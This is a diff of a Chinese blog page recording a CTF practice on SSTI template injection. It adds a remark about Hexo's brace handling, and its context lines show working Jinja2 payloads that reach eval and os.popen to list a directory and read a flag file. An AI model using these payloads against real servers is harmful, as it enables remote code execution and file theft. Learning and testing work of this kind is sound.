@@ -155,7 +155,7 @@
             </div>
             <h2 class="post-title">寒假练习26——SSTI模板注入</h2>
             <div class="post-meta">
-                emm... 8461 words in the article |
+                emm... 8559 words in the article |
                 you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
             </div>
         </div>
@@ -257,7 +257,8 @@ builtins指的是python的内置函数，如eval(),chr()等</code></pre>
 <pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") &#125; &#125;&#123;% endif %&#125;&#123;% endfor %&#125;   </code></pre>
 <p>查看目录。<br><img src="https://i.loli.net/2021/02/22/uRqYDBLUfIJcKQr.png" alt="5.png"><br>接着查看flag文件。  </p>
 <pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag').read()") &#125; &#125;&#123;% endif %&#125;&#123;% endfor %&#125;  </code></pre>
-<p>还是这个简单省事。  </p>
+<p>还是这个简单省事。   </p>
+<p><strong>注：关于SSTI注入其实可以在用hexo上传博客时找到例子，因为hexo用的引擎是twig，它的语法也会将两个花括号视为执行的语句的标志，所以在上传的时候会报错，必须将两个括号用空格隔开才行。</strong></p>
 <h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实SSTI注入和sql注入很相似，都是通过执行一些相关语句来查看相关信息。也都有自己的一套流程。按部就班不难，难的是如何灵活应用魔法方法，和绕过一些限制，从而引用os模块或者可以利用的子类。  </p>
 <p>SSTI注入的payload很多，要多积累，有时候有的payload是无效的，原因还不清楚。。。。。。。  </p>
 <p>下面附上学习博客。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/109048578?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161381046216780265420418%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161381046216780265420418&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-109048578.first_rank_v2_pc_rank_v29&utm_term=SSTI%E5%8E%9F%E7%90%86">SSTI详解 一文了解SSTI和所有常见payload 以flask模板为例</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/yh1013024906/article/details/84330056?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161381046216780265420418%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161381046216780265420418&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-84330056.first_rank_v2_pc_rank_v29&utm_term=SSTI%E5%8E%9F%E7%90%86">FLASK模板注入 （SSTI）</a></p>
